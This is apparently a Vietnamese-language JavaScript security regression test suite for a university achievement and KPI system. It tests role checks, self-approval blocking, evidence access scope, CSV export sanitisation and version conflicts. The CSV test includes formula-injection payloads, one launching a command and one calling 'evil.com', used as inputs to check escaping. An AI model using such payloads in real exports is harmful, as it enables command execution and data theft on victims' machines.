/**
 * BỘ KIỂM THỬ ĐƠN VỊ HỒI QUY BẢO MẬT W5-Q1 (UNIT TEST SUITE)
 * Phụ trách: Tạ Trần Vinh Quang (W5-Q1)
 * Dự án: PTUD_PhatTrienUngDung
 *
 * Phạm vi kiểm tra:
 * 1. Role/Scope qua API, DB-backed active roles, CTE hierarchy, Admin scope restriction, Anti-Self-Approval
 * 2. File permissions: Private evidence stream, RecordsOfficer isolation, Immutability on VERIFIED status
 * 3. Search & Report: Scope filtering, CSV export permissions, CSV formula injection defense
 * 4. AI & KPI Scope: Evaluator access, Run history isolation, Recommendation generation & accept restrictions
 * 5. Optimistic Concurrency: Version conflict detection (409 ConflictError)
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import { requireRoles } from '../src/middlewares/requireRoles.js';
import { requireScope } from '../src/middlewares/requireScope.js';
import { antiSelfApproval } from '../src/middlewares/antiSelfApproval.js';
import { EvidenceService } from '../src/modules/evidences/evidenceService.js';
import { AchievementService } from '../src/modules/achievements/achievementService.js';
import { reportQuery, csvCell, report } from '../src/modules/reports/reportService.js';
import aiService from '../src/modules/ai/aiService.js';
import { buildCandidate, validatePeriod } from '../src/modules/kpi/recommendationService.js';
import {
  UnauthorizedError,
  ForbiddenError,
  OutOfScopeError,
  SelfApprovalError,
  ConflictError,
  ConcurrencyConflictError,
  ValidationError,
  NotFoundError,
} from '../src/utils/errors.js';
import { closeDB } from '../src/config/database.js';

test.after(async () => {
  await closeDB();
});

// ============================================================================
// 1. KIỂM THỬ PHÂN QUYỀN API: REQUIRE ROLES & DB-BACKED ACTIVE ROLES
// ============================================================================
test('1. [W5-Q1 API / Role] requireRoles kiểm tra quyền thực tế từ DB; từ chối khi vai trò bị thu hồi', async () => {
  // Giả lập middleware requireRoles yêu cầu MANAGER
  const middleware = requireRoles('MANAGER');

  // Case 1.1: Request không có user hoặc thiếu userId -> 401 UnauthorizedError
  const reqUnauth = { headers: {} };
  let errorUnauth = null;
  await middleware(reqUnauth, {}, (err) => { errorUnauth = err; });
  assert.ok(errorUnauth instanceof UnauthorizedError, 'Phải ném UnauthorizedError khi chưa xác thực');

  // Case 1.2: Token có role nhưng DB đã thu hồi role -> 403 ForbiddenError
  // (req.user mang claim cũ nhưng getActiveRoles trong DB chỉ trả về LECTURER)
  const reqRevoked = {
    user: {
      userId: 99999, // user không tồn tại hoặc không có role MANAGER trong DB
      roles: ['MANAGER'], // Token cũ chứa MANAGER
    },
  };
  let errorRevoked = null;
  await middleware(reqRevoked, {}, (err) => { errorRevoked = err; });
  assert.ok(errorRevoked instanceof ForbiddenError, 'Phải ném ForbiddenError khi role đã bị thu hồi trong DB');
  assert.match(errorRevoked.message, /Yêu cầu một trong các vai trò: \[MANAGER\]/);
});

// ============================================================================
// 2. KIỂM THỬ QUY TẮC LIÊM CHÍNH & ANTI-SELF-APPROVAL
// ============================================================================
test('2. [W5-Q1 API / Liêm chính] Anti-Self-Approval cấm thẩm định viên tự duyệt hồ sơ của chính mình', async () => {
  const middleware = antiSelfApproval((req) => req.body.lecturerUserId);

  // Case 2.1: Thẩm định viên (userId: 10) cố thẩm định hồ sơ của chính mình (lecturerUserId: 10) -> 403
  const reqSelf = {
    user: { userId: 10 },
    body: { lecturerUserId: 10 },
  };
  let errorSelf = null;
  await middleware(reqSelf, {}, (err) => { errorSelf = err; });
  assert.ok(errorSelf instanceof SelfApprovalError, 'Phải ném SelfApprovalError');
  assert.equal(errorSelf.statusCode, 403);
  assert.equal(errorSelf.code, 'SELF_APPROVAL_PROHIBITED');

  // Case 2.2: Thẩm định viên (userId: 10) thẩm định hồ sơ của giảng viên khác (lecturerUserId: 20) -> Cho phép
  const reqOther = {
    user: { userId: 10 },
    body: { lecturerUserId: 20 },
  };
  let nextCalled = false;
  await middleware(reqOther, {}, (err) => {
    assert.ifError(err);
    nextCalled = true;
  });
  assert.equal(nextCalled, true, 'Phải cho phép tiếp tục khi không phải tự duyệt');
});

// ============================================================================
// 3. KIỂM THỬ PHÂN QUYỀN FILE & IMMUTABILITY (EVIDENCES)
// ============================================================================
test('3. [W5-Q1 File / Scope] EvidenceService chặn truy cập minh chứng ngoài phạm vi và bảo vệ tính bất biến', async () => {
  const mockAchievementRepo = {
    findAchievementById: async (id) => {
      if (id === 101) {
        return {
          achievementId: 101,
          status: 'VERIFIED', // Hồ sơ đã được duyệt -> Bất biến
          lecturerId: 5,
          lecturerUserId: 50,
          contextUnitId: 2,
        };
      }
      if (id === 102) {
        return {
          achievementId: 102,
          status: 'DRAFT',
          lecturerId: 5,
          lecturerUserId: 50,
          contextUnitId: 2,
        };
      }
      return null;
    },
    findActiveRepresentative: async () => null,
  };

  const mockEvidenceRepo = {
    findEvidenceById: async (id) => ({
      evidenceId: id,
      achievementId: 101,
      isRemoved: false,
    }),
    findEvidenceFileDetail: async (fileId) => ({
      evidenceFileId: fileId,
      achievementId: 102,
      lecturerId: 5,
      lecturerUserId: 50,
      contextUnitId: 2,
      achievementStatus: 'DRAFT',
      storageKey: 'evidences/2026/test.pdf',
      originalFileName: 'test.pdf',
    }),
  };

  const service = new EvidenceService({
    achievementRepo: mockAchievementRepo,
    evidenceRepo: mockEvidenceRepo,
    scopeChecker: async (userId, unitId, role) => false, // Người dùng ngoài scope
    roleGetter: async () => [{ Code: 'LECTURER' }],
    storageAdapter: {
      fileExists: async () => true,
      getFileStream: () => ({ pipe: () => {} }),
    },
  });

  // Case 3.1: Không có phiên đăng nhập (!user) -> 401 UnauthorizedError
  await assert.rejects(
    async () => service._assertCanViewAchievement({ achievementId: 102, contextUnitId: 2 }, null),
    (err) => err instanceof UnauthorizedError
  );

  // Case 3.2: Giảng viên khác (userId: 99) cố xem minh chứng của giảng viên (userId: 50) -> 403 OutOfScopeError
  const otherLecturer = { userId: 99, roles: ['LECTURER'] };
  await assert.rejects(
    async () => service._assertCanViewAchievement(
      { achievementId: 102, lecturerUserId: 50, contextUnitId: 2 },
      otherLecturer
    ),
    (err) => err instanceof OutOfScopeError && err.message.includes('không có quyền truy cập')
  );

  // Case 3.3: Hồ sơ đã VERIFIED -> Cấm sửa/thêm/xóa minh chứng (409 ConflictError / ACHIEVEMENT_IMMUTABLE)
  const ownerUser = { userId: 50, roles: ['LECTURER'] };
  await assert.rejects(
    async () => service._assertCanModifyAchievement(
      { achievementId: 101, status: 'VERIFIED', lecturerUserId: 50 },
      ownerUser
    ),
    (err) => err instanceof ConflictError && err.code === 'ACHIEVEMENT_IMMUTABLE'
  );

  // Case 3.4: Tải file ngoài scope -> getFileForDownload chặn với OutOfScopeError
  await assert.rejects(
    async () => service.getFileForDownload({ evidenceFileId: 501, user: otherLecturer }),
    (err) => err instanceof OutOfScopeError
  );
});

// ============================================================================
// 4. KIỂM THỬ XUẤT BÁO CÁO (EXPORT) & PHÒNG CHỐNG CSV INJECTION
// ============================================================================
test('4. [W5-Q1 Export / CSV] Phân quyền xuất báo cáo CSV và vệ sinh công thức chống CSV Formula Injection', () => {
  // Case 4.1: Kiểm tra hàm csvCell vệ sinh các ký tự nguy hiểm: =, +, -, @, tab, newline
  assert.equal(csvCell('=SUM(A1:A10)'), `"'=SUM(A1:A10)"`, 'Công thức = phải có dấu nháy đơn bảo vệ');
  assert.equal(csvCell('+cmd|/c calc'), ` "'+cmd|/c calc"`.trim(), 'Công thức + phải có dấu nháy đơn bảo vệ');
  assert.equal(csvCell('-123+456'), ` "'-123+456"`.trim(), 'Dấu - ở đầu phải có dấu nháy đơn bảo vệ');
  assert.equal(csvCell('@IMPORTDATA("http://evil.com")'), `"'@IMPORTDATA(""http://evil.com"")"`, 'Ký tự @ phải có dấu nháy đơn bảo vệ');
  assert.equal(csvCell('\tDữ liệu có tab'), ` "'\tDữ liệu có tab"`.trim(), 'Tab ở đầu phải có dấu nháy đơn bảo vệ');

  // Case 4.2: Dữ liệu thông thường an toàn không bị biến dạng
  assert.equal(csvCell('Bài báo khoa học Q1 IEEE'), `"Bài báo khoa học Q1 IEEE"`);
  assert.equal(csvCell(2026), `"2026"`);
  assert.equal(csvCell(null), `""`);

  // Case 4.3: SQL reportQuery tích hợp scope CTE:
  const queryResult = reportQuery({ search: 'nghiên cứu' }, 10);
  assert.ok(queryResult.sql.includes('scope_units AS'), 'SQL báo cáo bắt buộc phải chứa CTE phân quyền scope_units');
  assert.ok(queryResult.sql.includes('active_roles AS'), 'SQL báo cáo bắt buộc phải đọc active_roles từ DB');
  assert.ok(queryResult.sql.includes('title ILIKE'), 'SQL báo cáo hỗ trợ tìm kiếm an toàn');
});

// ============================================================================
// 5. KIỂM THỬ PHÂN QUYỀN AI & GỢI Ý KPI (SCOPE ISOLATION)
// ============================================================================
test('5. [W5-Q1 AI / Scope] Kiểm soát phạm vi truy cập AI Evaluator và Recommender', async () => {
  // Case 5.1: authorizeSubjectAccess chặn khi thiếu xác thực
  await assert.rejects(
    async () => aiService.authorizeSubjectAccess(null, 'LECTURER', 1),
    (err) => err instanceof ForbiddenError
  );

  // Case 5.2: Recommendation buildCandidate từ chối tiêu chí chưa duyệt, mô phỏng hoặc đã đạt
  const unconfirmedCrit = {
    isConfirmedByLhu: false,
    isSimulation: false,
    thresholdMetric: { isSatisfied: false, targetMin: 2, actualRecorded: 0, unitMetric: 'bài báo' },
    legalReferences: ['Quyết định 123/QĐ-ĐHLH'],
  };
  assert.equal(buildCandidate(unconfirmedCrit), null, 'Tiêu chí chưa xác nhận không được đưa vào gợi ý');

  const simulationCrit = {
    isConfirmedByLhu: true,
    isSimulation: true,
    thresholdMetric: { isSatisfied: false, targetMin: 2, actualRecorded: 0, unitMetric: 'bài báo' },
    legalReferences: ['Quyết định 123/QĐ-ĐHLH'],
  };
  assert.equal(buildCandidate(simulationCrit), null, 'Tiêu chí mô phỏng không được đưa vào gợi ý');

  const satisfiedCrit = {
    isConfirmedByLhu: true,
    isSimulation: false,
    thresholdMetric: { isSatisfied: true, targetMin: 2, actualRecorded: 2, unitMetric: 'bài báo' },
    legalReferences: ['Quyết định 123/QĐ-ĐHLH'],
  };
  assert.equal(buildCandidate(satisfiedCrit), null, 'Tiêu chí đã đạt không được đưa vào gợi ý');

  // Case 5.3: validatePeriod kiểm tra chặt chẽ thời hạn kế hoạch đa năm
  const multiYearCandidate = {
    requiresYearReview: true,
    target: 3,
    measureUnit: 'năm liên tiếp',
  };

  // Kỳ không đủ 3 năm lịch -> Ném ValidationError
  assert.throws(
    () => validatePeriod(multiYearCandidate, { periodStart: '2026-01-01', periodEnd: '2027-12-31' }),
    (err) => err instanceof ValidationError && err.message.includes('phải phủ ít nhất 3 năm lịch')
  );

  // Kỳ ngày không bắt đầu 01-01 -> Ném ValidationError
  assert.throws(
    () => validatePeriod(multiYearCandidate, { periodStart: '2026-03-01', periodEnd: '2028-12-31' }),
    (err) => err instanceof ValidationError
  );

  // Kỳ đủ 3 năm lịch hợp lệ (2026-2028) -> Hợp lệ
  assert.doesNotThrow(
    () => validatePeriod(multiYearCandidate, { periodStart: '2026-01-01', periodEnd: '2028-12-31' })
  );
});

// ============================================================================
// 6. KIỂM THỬ XUNG ĐỘT CẬP NHẬT PHIÊN BẢN ĐỒNG THỜI (OPTIMISTIC CONCURRENCY)
// ============================================================================
test('6. [W5-Q1 Concurrency] Phát hiện xung đột phiên bản (version mismatch) trả về ConflictError 409', async () => {
  const mockRepo = {
    findAchievementById: async () => ({
      achievementId: 301,
      subjectType: 'LECTURER',
      lecturerId: 5,
      lecturerUserId: 50,
      lecturer: { userId: 50 },
      contextUnitId: 2,
      status: 'DRAFT',
      version: 5, // Phiên bản hiện tại trong DB là 5
      title: 'Hồ sơ phiên bản 5',
    }),
    findLecturerByUserId: async (userId) => ({ lecturerId: 5, userId }),
    updateAchievement: async () => false,
  };

  const service = new AchievementService({
    repository: mockRepo,
    roles: async () => [{ Code: 'LECTURER' }],
  });

  const user = { userId: 50, roles: ['LECTURER'] };

  // Worker gửi request với stale version 4 trong khi DB đã lên version 5 -> 409 ConcurrencyConflictError
  await assert.rejects(
    async () => service.updateAchievement(user, 301, { version: 4, title: 'Cập nhật từ tab cũ' }),
    (err) => (err instanceof ConcurrencyConflictError || err instanceof ConflictError) && err.message.includes('version')
  );
});
